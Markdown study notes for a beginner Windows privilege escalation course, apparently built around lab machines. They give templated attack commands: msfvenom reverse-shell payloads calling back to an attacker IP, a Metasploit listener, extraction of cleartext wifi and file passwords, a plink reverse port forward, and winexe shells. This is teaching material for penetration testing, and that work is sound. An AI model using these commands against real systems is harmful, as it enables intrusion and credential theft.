# Windows Privilege Escalation for Beginners

Resources: https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources

Fuzzy Security Guide: https://www.fuzzysecurity.com/tutorials/16.html

AllTheThings Guide: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

## Gaining a Foothold (Box 1)

Connect to ftp
- `ftp [target-ip] -p [port]`

Establish a meterpreter webshell
- `msfvenom -p [payload] LHOST=[attacker-ip] LPORT=[attacker-port] -f [filetype] -o [output name]`
  - Payload examples
    - `windows/meterpreter/reverse_tcp`
    - `windows/x64/meterpreter/reverse_tcp`
    - `windows/reverse_tcp`
  - Filetype examples: `aspx`, `php`, `exe`, `py`
- `msfconsole`
  - `use exploit/multi/handler`
  - `set payload [payload]`

If the system is using `x86` / `32 bit` architecture
- `msfconsole`
- `search local_exploit_suggester`

## Initial Enumeration

### System Enumeration

Look at system info `sysinfo`.
- `systeminfo`
  - `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- `hostname`
- `wmic qfe`
  - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- `wmic logicaldisk get caption,description,providername`

### User Enumeration

Enumeration:
- `whoami`
  - `whoami /priv`
  - `whoami /groups`
- `net user`
  - `net user [name]`
- `net localgroup`
  - `net localgroup [group-name]`

### Network Enumeration

Enumeration:
- `ipconfig`
  - `ipconfig /all`
- `arp -a`
  - Can indicate what other machines are on the network
- `route print`
- `netstat -ano`

### Password Hunting

Passwords are sometimes found in files. Additionally, the SAM file is interesting and some passwords are stored in plaintext.
- Look inside the directory in files
  - `findstr /si password *.txt *.ini *.config`
- Wifi password: 
  - Get SSID: `netsh wlan show profile`
  - Get cleartext password: `netsh wlan show profile [SSID] key=clear`

### Anti-Virus Enumeration

Enumeration:
- Anti-virus: `sc query`
  - `sc query windefend`
  - `sc queryex type= service`
- Firewalls: 
  - `netsh advfirewall firewall dump`
  - `netsh firewall show state`
  - `netsh firewall show config`

## Automated tools

### Automated Tool Overview

Windows PrivEsec Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Executables:
- WinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS 
- Watson: https://github.com/rasta-mouse/Watson
- SharpUp: https://github.com/GhostPack/SharpUp
- Seatbelt: https://github.com/GhostPack/Seatbelt

Powershell:
- Sherlock: https://github.com/rasta-mouse/Sherlock
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- jaws-enum: https://github.com/411Hall/JAWS

Other:
- windows-exploit-suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Local Exploit Suggester: 
  - `msfconsole`
  - `search local_exploit_suggester`
  - In meterpreter shell: `run post/multi/recon/local_exploit_suggester`

## Escalation Path: Kernel Exploits

Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

A kernel is a program that controls everything in the system and it facilitates the interactions between hardware and software.

- `ms10-015 kitrap0d`
- `ms10-059 Chimichurri`

## Escalation Path: Passwords and Port Forwarding

Be sure to analyse the systems active on all ports!
- `nmap -T4 -p- -sV [ip]`

Look for open ports that weren't found in the nmap scan
- `netstat -ano`

Hunting passwords:
- Looking in the registry can be a quick win
- Try to use all found credentials on all users

Trigger a port forward:
- `plink`: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
- `sudo apt install ssh`
- `nano /etc/ssh/sshd_config`
  - Enable `permit root login`
  - Possibly change the port.
- `service ssh restart`
- `service ssh start`
- `plink.exe -l [user] -pw [password] -R 445:127.0.0.1:445 [attacker-ip]`

Execute commands on a windows system:
- `winexe -U [user]%[password] //127.0.0.1 "cmd.exe"`
- Execute commands multiple times.

## Escalation Path: Windows Subsystem for Linux

